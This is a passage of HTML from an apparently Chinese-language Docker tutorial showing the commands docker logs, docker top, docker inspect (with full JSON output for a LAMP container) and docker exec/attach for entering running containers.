class="line"> docker run -d centos /bin/sh -c &quot;while true;do echo M0th;sleep 1;done&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">显示日志</span></span><br><span class="line">-tf   #显示日志</span><br><span class="line">--tail number #显示日志条数</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ /]# docker logs -tf 71dbe6949346</span><br></pre></td></tr></table></figure><p><strong>查看容器中进程信息 ps</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令 docker top 容器id</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker top 8d22f31c06c3        </span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                20245               20229               0                   Aug05               ?                   00:02:29            /usr/bin/python3 /usr/local/bin/supervisord -n</span><br><span class="line">root                20778               20245               0                   Aug05               ?                   00:00:25     </span><br></pre></td></tr></table></figure><p><strong>查看镜像的元数据</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令 docker inspect 容器id</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker inspect 8d22f31c06c3   </span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2020-08-05T12:30:31.628557831Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/run.sh&quot;,</span><br><span class="line">        &quot;Args&quot;: [],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 20245,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: &quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2020-08-05T12:30:32.123111712Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:05750cfa54d5c07510961007006dfaae6849739487a550e6d7588c9b550625cb&quot;,</span><br><span class="line">        &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e/resolv.conf&quot;,</span><br><span class="line">        &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e/hostname&quot;,</span><br><span class="line">        &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e/hosts&quot;,</span><br><span class="line">        &quot;LogPath&quot;: &quot;/var/lib/docker/containers/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e/8d22f31c06c3d2819837dd9c3d303a37eeeb1fc16f078e521f3a8f17f034f91e-json.log&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;/web_xiazhu&quot;,</span><br><span class="line">        &quot;RestartCount&quot;: 0,</span><br><span class="line">        &quot;Driver&quot;: &quot;overlay2&quot;,</span><br><span class="line">        &quot;Platform&quot;: &quot;linux&quot;,</span><br><span class="line">        &quot;MountLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ProcessLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AppArmorProfile&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ExecIDs&quot;: [</span><br><span class="line">            &quot;d3caf6aedf329e2db44c6e62d9a7551ec2e8238101f4bbb4afec12cb8fe32da9&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: [</span><br><span class="line">                &quot;/home/test/xiazhu/:/app&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ContainerIDFile&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LogConfig&quot;: &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;json-file&quot;,</span><br><span class="line">                &quot;Config&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;NetworkMode&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;PortBindings&quot;: &#123;</span><br><span class="line">                &quot;80/tcp&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;HostIp&quot;: &quot;&quot;,</span><br><span class="line">                        &quot;HostPort&quot;: &quot;80&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;RestartPolicy&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;no&quot;,</span><br><span class="line">                &quot;MaximumRetryCount&quot;: 0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;AutoRemove&quot;: false,</span><br><span class="line">            &quot;VolumeDriver&quot;: &quot;&quot;,</span><br><span class="line">            &quot;VolumesFrom&quot;: null,</span><br><span class="line">            &quot;CapAdd&quot;: null,</span><br><span class="line">            &quot;CapDrop&quot;: null,</span><br><span class="line">            &quot;Capabilities&quot;: null,</span><br><span class="line">            &quot;Dns&quot;: [],</span><br><span class="line">            &quot;DnsOptions&quot;: [],</span><br><span class="line">            &quot;DnsSearch&quot;: [],</span><br><span class="line">            &quot;ExtraHosts&quot;: null,</span><br><span class="line">            &quot;GroupAdd&quot;: null,</span><br><span class="line">            &quot;IpcMode&quot;: &quot;private&quot;,</span><br><span class="line">            &quot;Cgroup&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Links&quot;: null,</span><br><span class="line">            &quot;OomScoreAdj&quot;: 0,</span><br><span class="line">            &quot;PidMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Privileged&quot;: false,</span><br><span class="line">            &quot;PublishAllPorts&quot;: false,</span><br><span class="line">            &quot;ReadonlyRootfs&quot;: false,</span><br><span class="line">            &quot;SecurityOpt&quot;: null,</span><br><span class="line">            &quot;UTSMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;UsernsMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;ShmSize&quot;: 67108864,</span><br><span class="line">            &quot;Runtime&quot;: &quot;runc&quot;,</span><br><span class="line">            &quot;ConsoleSize&quot;: [</span><br><span class="line">                0,</span><br><span class="line">                0</span><br><span class="line">            ],</span><br><span class="line">            &quot;Isolation&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpuShares&quot;: 0,</span><br><span class="line">            &quot;Memory&quot;: 0,</span><br><span class="line">            &quot;NanoCpus&quot;: 0,</span><br><span class="line">            &quot;CgroupParent&quot;: &quot;&quot;,</span><br><span class="line">            &quot;BlkioWeight&quot;: 0,</span><br><span class="line">            &quot;BlkioWeightDevice&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceReadIOps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteIOps&quot;: null,</span><br><span class="line">            &quot;CpuPeriod&quot;: 0,</span><br><span class="line">            &quot;CpuQuota&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimePeriod&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimeRuntime&quot;: 0,</span><br><span class="line">            &quot;CpusetCpus&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpusetMems&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Devices&quot;: [],</span><br><span class="line">            &quot;DeviceCgroupRules&quot;: null,</span><br><span class="line">            &quot;DeviceRequests&quot;: null,</span><br><span class="line">            &quot;KernelMemory&quot;: 0,</span><br><span class="line">            &quot;KernelMemoryTCP&quot;: 0,</span><br><span class="line">            &quot;MemoryReservation&quot;: 0,</span><br><span class="line">            &quot;MemorySwap&quot;: 0,</span><br><span class="line">            &quot;MemorySwappiness&quot;: null,</span><br><span class="line">            &quot;OomKillDisable&quot;: false,</span><br><span class="line">            &quot;PidsLimit&quot;: null,</span><br><span class="line">            &quot;Ulimits&quot;: null,</span><br><span class="line">            &quot;CpuCount&quot;: 0,</span><br><span class="line">            &quot;CpuPercent&quot;: 0,</span><br><span class="line">            &quot;IOMaximumIOps&quot;: 0,</span><br><span class="line">            &quot;IOMaximumBandwidth&quot;: 0,</span><br><span class="line">            &quot;MaskedPaths&quot;: [</span><br><span class="line">                &quot;/proc/asound&quot;,</span><br><span class="line">                &quot;/proc/acpi&quot;,</span><br><span class="line">                &quot;/proc/kcore&quot;,</span><br><span class="line">                &quot;/proc/keys&quot;,</span><br><span class="line">                &quot;/proc/latency_stats&quot;,</span><br><span class="line">                &quot;/proc/timer_list&quot;,</span><br><span class="line">                &quot;/proc/timer_stats&quot;,</span><br><span class="line">                &quot;/proc/sched_debug&quot;,</span><br><span class="line">                &quot;/proc/scsi&quot;,</span><br><span class="line">                &quot;/sys/firmware&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ReadonlyPaths&quot;: [</span><br><span class="line">                &quot;/proc/bus&quot;,</span><br><span class="line">                &quot;/proc/fs&quot;,</span><br><span class="line">                &quot;/proc/irq&quot;,</span><br><span class="line">                &quot;/proc/sys&quot;,</span><br><span class="line">                &quot;/proc/sysrq-trigger&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;GraphDriver&quot;: &#123;</span><br><span class="line">            &quot;Data&quot;: &#123;</span><br><span class="line">                &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/ebebfaa4b93ab4d3ff6427c01ec419d58ee297be87c2eedbc2dcd4de5167b334-init/diff:/var/lib/docker/overlay2/c1343d6ef5f96ef7b8788ba30857be230a33625f29b488b4c0c70fb21adfb08e/diff:/var/lib/docker/overlay2/2e9f1c384547dbd7a124f5b6eb4c1ab15873cef0ce5066626fe0861e4eddab52/diff:/var/lib/docker/overlay2/31e671bc91fec3af9fad626e6d73af70ec332172e15212e6462f6e6973d87419/diff:/var/lib/docker/overlay2/f7102f0680b31edb1e3b5c53d89ad1b639e9c41358ea586b3fc84aa5b4641aef/diff:/var/lib/docker/overlay2/1b84b765199b9cedfc2f6ea58636656f5961caa1f8ba37b7909d8a1742493b75/diff:/var/lib/docker/overlay2/6ac3df1e16de1e6288bd0645fc5556b6c522a28408679a76c44c4350e4fc9ca1/diff:/var/lib/docker/overlay2/76afcff3df12508920dd1defb189791018bad6d87756b1e23a3aec1a2efdfcce/diff:/var/lib/docker/overlay2/9a8b202f8cfe6f753c47b88797b59f35190801ab8e334e20923b8c98c684fb5a/diff:/var/lib/docker/overlay2/a4a93d61566664522c4d98682057dd6797ce5f1cbae3ef7abe846e2cf32be798/diff:/var/lib/docker/overlay2/649a9d94d57323c8b4137a8e5b812621b6ee837141baa172ef9204c49074f777/diff:/var/lib/docker/overlay2/c1ccb19bec5233d60e65a447c89f070769210055f85448bca2af18f12ea90fcd/diff:/var/lib/docker/overlay2/91244974b7898ed4a79eb8a2734725e8f9620d2d03c8b529710fa024fe86af4d/diff:/var/lib/docker/overlay2/6d2fe1d6c57ef834de5dc8796357d4c0a0f3a270edb4e3e87daa6e444b47ce69/diff:/var/lib/docker/overlay2/653fcbce9d13f98dbf5d4cb545bf7a1da5371f8a746ba8b8ea3a3b5959d07a17/diff:/var/lib/docker/overlay2/d36609d04bc0e8ea0f365ecf570fc26e0d9fc364bd2d6ad0a8bf88cad8f849b1/diff:/var/lib/docker/overlay2/a717d0eb3b83c51f58b392b2cfda562737351dc2e0881622426242f5e478e57e/diff:/var/lib/docker/overlay2/065f71e31df3cd3fcc006f0d83fb9ecb9913bf6068666a49c7848a7af1ec7743/diff:/var/lib/docker/overlay2/7fd6afde1cda0152e3ad18b8db54479e36b3bd5e70eacd06c5f4a7feee7de17a/diff:/var/lib/docker/overlay2/ef5d5f11888435af3f971616b126560968d60f3eabd8d117a9dddd2da6d63ad0/diff:/var/lib/docker/overlay2/d5f4a70934da8614824485ef3d83395ee460cb79de2c76b0ced1f02525a53664/diff:/var/lib/docker/overlay2/a91a8e08e2f10182e3104d81c74274e3ad9ffc8c6e2a92077f0ee3d5353cc1b1/diff:/var/lib/docker/overlay2/afaa392ae9da980a4396a44659fcfb9c0651e1393c4f8556de954f620840584c/diff:/var/lib/docker/overlay2/7acc3573b193f9069c54dfd93a7ced575f79a29f6be80a2d4659055158c77c3d/diff:/var/lib/docker/overlay2/e61644b54ff01f528f9567280cdd9706da6efebe5a7d690eeae6c82c57edd4c4/diff:/var/lib/docker/overlay2/68595846d6ec0d0d459db6d4e2c5ea24f912507f12a6d3fa9b8c09f4d279a830/diff:/var/lib/docker/overlay2/5c490f1745a988a9f10ee02a5dd8d29303501a6ced9ca63f4467ef19b4554b37/diff:/var/lib/docker/overlay2/b4749da2903824af7a466dd462f520be1253b7ccde4a2c9fa0b0a024d19ea90b/diff:/var/lib/docker/overlay2/62eb6beb7057f1d9560c80512761cda66c75430db0feab90593bc849deaacf27/diff:/var/lib/docker/overlay2/e49935005bc3bdb1cd18c5a9bd8b2c7e1511ee9cf47dd4a583f10df3bbf54b77/diff&quot;,</span><br><span class="line">                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/ebebfaa4b93ab4d3ff6427c01ec419d58ee297be87c2eedbc2dcd4de5167b334/merged&quot;,</span><br><span class="line">                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/ebebfaa4b93ab4d3ff6427c01ec419d58ee297be87c2eedbc2dcd4de5167b334/diff&quot;,</span><br><span class="line">                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/ebebfaa4b93ab4d3ff6427c01ec419d58ee297be87c2eedbc2dcd4de5167b334/work&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Name&quot;: &quot;overlay2&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Mounts&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;volume&quot;,</span><br><span class="line">                &quot;Name&quot;: &quot;ae7974b2803d720828fd3c681db9bb72f2352445847a757533387bc7af6b1654&quot;,</span><br><span class="line">                &quot;Source&quot;: &quot;/var/lib/docker/volumes/ae7974b2803d720828fd3c681db9bb72f2352445847a757533387bc7af6b1654/_data&quot;,</span><br><span class="line">                &quot;Destination&quot;: &quot;/var/lib/mysql&quot;,</span><br><span class="line">                &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,</span><br><span class="line">                &quot;Propagation&quot;: &quot;&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;bind&quot;,</span><br><span class="line">                &quot;Source&quot;: &quot;/home/test/xiazhu&quot;,</span><br><span class="line">                &quot;Destination&quot;: &quot;/app&quot;,</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,</span><br><span class="line">                &quot;Propagation&quot;: &quot;rprivate&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;Config&quot;: &#123;</span><br><span class="line">            &quot;Hostname&quot;: &quot;8d22f31c06c3&quot;,</span><br><span class="line">            &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">            &quot;User&quot;: &quot;&quot;,</span><br><span class="line">            &quot;AttachStdin&quot;: false,</span><br><span class="line">            &quot;AttachStdout&quot;: false,</span><br><span class="line">            &quot;AttachStderr&quot;: false,</span><br><span class="line">            &quot;ExposedPorts&quot;: &#123;</span><br><span class="line">                &quot;3306/tcp&quot;: &#123;&#125;,</span><br><span class="line">                &quot;80/tcp&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Tty&quot;: false,</span><br><span class="line">            &quot;OpenStdin&quot;: false,</span><br><span class="line">            &quot;StdinOnce&quot;: false,</span><br><span class="line">            &quot;Env&quot;: [</span><br><span class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,</span><br><span class="line">                &quot;DEBIAN_FRONTEND=noninteractive&quot;,</span><br><span class="line">                &quot;LANG=en_US.UTF-8&quot;,</span><br><span class="line">                &quot;LANGUAGE=en_US:en&quot;,</span><br><span class="line">                &quot;LC_ALL=en_US.UTF-8&quot;,</span><br><span class="line">                &quot;REFRESHED_AT=2019-06-11&quot;,</span><br><span class="line">                &quot;DOCKER_USER_ID=501&quot;,</span><br><span class="line">                &quot;DOCKER_USER_GID=20&quot;,</span><br><span class="line">                &quot;BOOT2DOCKER_ID=1000&quot;,</span><br><span class="line">                &quot;BOOT2DOCKER_GID=50&quot;,</span><br><span class="line">                &quot;PHPMYADMIN_VERSION=5.0.2&quot;,</span><br><span class="line">                &quot;SUPERVISOR_VERSION=4.2.0&quot;,</span><br><span class="line">                &quot;MYSQL_PASS:-$(pwgen=-s 12 1)&quot;,</span><br><span class="line">                &quot;PHP_UPLOAD_MAX_FILESIZE=10M&quot;,</span><br><span class="line">                &quot;PHP_POST_MAX_SIZE=10M&quot;,</span><br><span class="line">                &quot;PHP_VERSION=7.4&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;/run.sh&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Image&quot;: &quot;mattrayner/lamp&quot;,</span><br><span class="line">            &quot;Volumes&quot;: &#123;</span><br><span class="line">                &quot;/app&quot;: &#123;&#125;,</span><br><span class="line">                &quot;/var/lib/mysql&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">            &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;NetworkSettings&quot;: &#123;</span><br><span class="line">            &quot;Bridge&quot;: &quot;&quot;,</span><br><span class="line">            &quot;SandboxID&quot;: &quot;af9a4d8af247e84a627282ec290a011617e05814cfc846ec08ded1b9459d83ee&quot;,</span><br><span class="line">            &quot;HairpinMode&quot;: false,</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;Ports&quot;: &#123;</span><br><span class="line">                &quot;3306/tcp&quot;: null,</span><br><span class="line">                &quot;80/tcp&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;HostIp&quot;: &quot;0.0.0.0&quot;,</span><br><span class="line">                        &quot;HostPort&quot;: &quot;80&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/af9a4d8af247&quot;,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;EndpointID&quot;: &quot;f19367979298b5833f6b57b8943d8561e143b86254a90f342644f4fc97549170&quot;,</span><br><span class="line">            &quot;Gateway&quot;: &quot;172.18.0.1&quot;,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;172.18.0.2&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;MacAddress&quot;: &quot;02:42:ac:12:00:02&quot;,</span><br><span class="line">            &quot;Networks&quot;: &#123;</span><br><span class="line">                &quot;bridge&quot;: &#123;</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;Links&quot;: null,</span><br><span class="line">                    &quot;Aliases&quot;: null,</span><br><span class="line">                    &quot;NetworkID&quot;: &quot;9e04c1fc198894a540c9c53c7d2f51403aca4f6501be0650f04a370b39a8e9ad&quot;,</span><br><span class="line">                    &quot;EndpointID&quot;: &quot;f19367979298b5833f6b57b8943d8561e143b86254a90f342644f4fc97549170&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.18.0.1&quot;,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;172.18.0.2&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">                    &quot;MacAddress&quot;: &quot;02:42:ac:12:00:02&quot;,</span><br><span class="line">                    &quot;DriverOpts&quot;: null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>进入当前正在运行的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">我们通常容器是使用后台方式运行的，需要进入容器，修改一些配置</span></span><br><span class="line"><span class="meta">#</span><span class="bash">命令</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">方式一</span></span><br><span class="line">docker exec -it 容器id /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">测试</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                          NAMES</span><br><span class="line">8d22f31c06c3        mattrayner/lamp     &quot;/run.sh&quot;           8 days ago          Up 8 days           0.0.0.0:80-&gt;80/tcp, 3306/tcp   web_xiazhu</span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker exec -it 8d22f31c06c3 /bin/bash</span><br><span class="line">root@8d22f31c06c3:/# ls</span><br><span class="line">app       boot                   etc   lib64  opt   run     srv               supervisor-4.2.0  sys  var</span><br><span class="line">bd_build  create_mysql_users.sh  home  media  proc  run.sh  start-apache2.sh  supervisord.log   tmp</span><br><span class="line">bin       dev                    lib   mnt    root  sbin    start-mysqld.sh   supervisord.pid   usr</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">方式二</span></span><br><span class="line">docker attach 容器id</span><br><span class="line"><span class="meta">#</span><span class="bash">测试</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker attach 8d22f31c06c3</span><br><span class="line">正在运行...</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">docker <span class="built_in">exec</span> <span class="comment">#进入容器后开启一个新的终端，可以在里面操作（常用）</span></span></span><br><span class="line"><span class="meta">#</span><span 